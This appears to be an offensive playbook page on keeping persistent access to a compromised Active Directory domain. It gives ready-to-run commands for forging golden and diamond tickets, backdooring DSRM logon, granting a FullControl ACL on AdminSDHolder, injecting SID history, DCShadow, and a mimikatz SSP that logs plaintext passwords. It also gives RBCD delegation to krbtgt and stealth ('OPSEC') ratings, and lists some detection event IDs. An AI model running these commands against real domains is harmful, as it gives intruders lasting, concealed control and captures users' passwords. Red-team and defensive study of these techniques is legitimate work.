# AD Persistence

tags: persistence, golden-ticket, diamond-ticket, skeleton-key, dsrm, adminsdholder, sid-history, dcshadow, active-directory

## Objective
Establish persistent access to the Active Directory domain that survives password resets and standard remediation.

## Prerequisites
- Domain Admin or equivalent privileges
- krbtgt hash (for golden/diamond tickets)
- Access to domain controller (for some techniques)

## Methodology

### Persistence Techniques Reference

| Technique | OPSEC | Persistent | Key Command | Detection |
|-----------|-------|-----------|-------------|-----------|
| Golden Ticket | 0.3 | Until krbtgt rotated 2× | See below | 4769 without matching AS-REQ |
| Diamond Ticket | 0.2 | Until krbtgt rotated 2× | See below | PAC/group mismatch |
| Skeleton Key | 0.7 | No (until DC reboot) | `mimikatz# misc::skeleton` | Event 7045 driver install |
| DSRM | 0.4 | Yes (registry) | See below | Event 4657 registry change |
| AdminSDHolder | 0.5 | Yes (ACL, SDProp) | See below | Event 5136 on AdminSDHolder |
| SID History | 0.4 | Yes (attribute) | See below | Event 4765 SID History added |
| DCShadow | 0.6 | Depends | See below | Event 4929 replication from non-DC |
| Custom SSP | 0.7 | Registry=yes | See below | Event 4611 LSA package registered |
| RBCD to krbtgt | 0.4 | Yes (AD attribute) | See below | Event 5136 on krbtgt object |

### Golden Ticket (OPSEC: 0.3)
```bash
# Forge TGT with krbtgt hash — valid until krbtgt rotated TWICE
impacket-ticketer -aesKey KRBTGT_AES256 -domain-sid S-1-5-21-xxx \
  -domain dom.com Administrator
export KRB5CCNAME=Administrator.ccache
```

### Diamond Ticket (OPSEC: 0.2)
```bash
# Modify a legitimate TGT — harder to detect than golden ticket
Rubeus.exe diamond /krbkey:AES256 /ticketuser:admin /ldap /opsec
```

### DSRM Backdoor (OPSEC: 0.4)
```bash
# Enable DSRM logon on DC — allows local admin login with DSRM password
reg add "HKLM\System\CurrentControlSet\Control\Lsa" \
  /v DsrmAdminLogonBehavior /t REG_DWORD /d 2
```

### AdminSDHolder (OPSEC: 0.5)
```bash
# Add persistent ACL — SDProp overwrites protected object ACLs every 60 min
dacledit.py -action write -rights FullControl -principal attacker \
  -target-dn 'CN=AdminSDHolder,CN=System,DC=dom,DC=com' dom/user:pass
```

### SID History Injection (OPSEC: 0.4)
```bash
# Add Enterprise Admins SID to a controlled user
mimikatz# sid::add /sam:user /new:S-1-5-21-xxx-519
```

### DCShadow (OPSEC: 0.6)
```bash
# Register as a fake DC to push AD changes without logging
# Requires two mimikatz sessions:
# Session 1 (SYSTEM): lsadump::dcshadow /object:user /attribute:attr /value:val
# Session 2 (DA): lsadump::dcshadow /push
```

### Custom SSP (OPSEC: 0.7)
```bash
# In-memory SSP — logs plaintext passwords until reboot
mimikatz# misc::memssp
# Passwords logged to C:\Windows\System32\mimilsa.log

# Persistent via registry — survives reboot
# Add to: HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages
```

### RBCD to krbtgt (OPSEC: 0.4)
```bash
# Configure RBCD delegation to krbtgt — persistent S4U access
impacket-rbcd -delegate-to 'krbtgt' -delegate-from 'EVIL$' \
  -action write -dc-ip DC 'DOMAIN/admin:pass'
```

## Graph Reporting
- **Persistence edges**: from attacker-controlled node to domain
- **Credential nodes**: for forged tickets, DSRM password
- **Update objective**: mark persistence as established
- Track persistence type and remediation requirements

## OPSEC Notes
- Golden/Diamond tickets leave no trace on DC until used
- AdminSDHolder persists through SDProp cycle (every 60 min)
- Skeleton Key requires DC memory access — very invasive
- DCShadow requires two privileged sessions simultaneously

**Detection**: Event 5136 (AD attribute modifications), 4929 (replication from non-DC), 7045 (driver install), 4765 (SID History), 4657 (registry changes), 4611 (LSA package).

## Sequencing
- **After**: AD Privilege Escalation (need DA/krbtgt hash), Credential Dumping
- **Feeds →**: Long-term access, re-entry after remediation
- **Final phase** of engagement — establish before reporting
